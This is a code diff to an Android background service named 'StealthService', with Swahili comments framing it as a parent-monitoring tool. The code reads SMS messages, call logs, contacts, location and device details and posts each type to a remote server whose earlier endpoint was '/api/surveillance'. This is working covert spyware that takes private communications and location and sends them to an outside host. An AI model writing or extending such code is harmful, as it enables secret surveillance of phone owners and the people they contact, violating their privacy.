@@ -5,12 +5,7 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.location.Location;
-import android.location.LocationListener;
 import android.location.LocationManager;
-import android.media.MediaRecorder;
-import android.net.Uri;
-import android.os.Bundle;
-import android.os.Environment;
 import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
@@ -22,7 +17,6 @@ import android.content.pm.PackageManager;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import java.io.File;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -38,8 +32,6 @@ public class StealthService extends Service {
     private String parentCode;
     private SharedPreferences prefs;
     private LocationManager locationManager;
-    private MediaRecorder mediaRecorder;
-    private boolean isRecording = false;
 
     @Override
     public void onCreate() {
@@ -90,37 +82,41 @@ public class StealthService extends Service {
 
     private void collectAndSendAllData() {
         try {
-            JSONObject allData = new JSONObject();
-            allData.put("parent_code", parentCode);
-            allData.put("device_id", android.os.Build.MODEL);
-            allData.put("timestamp", System.currentTimeMillis());
-            allData.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
-
-            // Collect SMS data
+            // 1. Kusanya SMS za mtoto
             if (checkPermission(Manifest.permission.READ_SMS)) {
-                allData.put("sms_data", collectSMSData());
+                JSONArray smsData = collectSMSData();
+                if (smsData.length() > 0) {
+                    sendParentDataToServer("sms", smsData);
+                }
             }
 
-            // Collect calls data
+            // 2. Kusanya simu za mtoto
             if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
-                allData.put("calls_data", collectCallsData());
+                JSONArray callsData = collectCallsData();
+                if (callsData.length() > 0) {
+                    sendParentDataToServer("calls", callsData);
+                }
             }
 
-            // Collect contacts data
+            // 3. Kusanya anwani za mtoto
             if (checkPermission(Manifest.permission.READ_CONTACTS)) {
-                allData.put("contacts_data", collectContactsData());
+                JSONArray contactsData = collectContactsData();
+                if (contactsData.length() > 0) {
+                    sendParentDataToServer("contacts", contactsData);
+                }
             }
 
-            // Collect location data
+            // 4. Kusanya location ya mtoto
             if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
-                allData.put("location_data", collectLocationData());
+                JSONObject locationData = collectLocationData();
+                if (locationData.length() > 0) {
+                    sendParentDataToServer("location", locationData);
+                }
             }
 
-            // Collect device info
-            allData.put("device_info", collectDeviceInfo());
-
-            // Send to GhostTester server
-            sendToServer(allData);
+            // 5. Tuma device info
+            JSONObject deviceInfo = collectDeviceInfo();
+            sendParentDataToServer("device_info", deviceInfo);
 
         } catch (Exception e) {
             Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
@@ -263,10 +259,18 @@ public class StealthService extends Service {
         return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
     }
 
-    private void sendToServer(JSONObject data) {
+    // 🆕 NJIA MPYA YA KUTUMA DATA KWA MZAZI
+    private void sendParentDataToServer(String dataType, Object dataContent) {
         new Thread(() -> {
             try {
-                String serverUrl = "https://GhostTester.pythonanywhere.com/api/surveillance";
+                // ✅ URL SAHIHI KWA DATA YA MZAZI
+                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
+                
+                JSONObject postData = new JSONObject();
+                postData.put("parent_code", parentCode);
+                postData.put("data_type", dataType);
+                postData.put("device_id", android.os.Build.MODEL);
+                postData.put("data_content", dataContent);
 
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -277,19 +281,19 @@ public class StealthService extends Service {
                 conn.setReadTimeout(15000);
 
                 OutputStream os = conn.getOutputStream();
-                os.write(data.toString().getBytes());
+                os.write(postData.toString().getBytes());
                 os.flush();
                 os.close();
 
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
-                    Log.d(TAG, "✅ Data imetumwa kikamilifu kwa server - " + new Date());
+                    Log.d(TAG, "✅ " + dataType + " data imetumwa kwa mzazi - " + new Date());
                 } else {
-                    Log.e(TAG, "❌ Server returned error: " + responseCode);
+                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                 }
 
             } catch (Exception e) {
-                Log.e(TAG, "❌ Error sending data: " + e.getMessage());
+                Log.e(TAG, "❌ Error sending " + dataType + " data: " + e.getMessage());
             }
         }).start();
     }
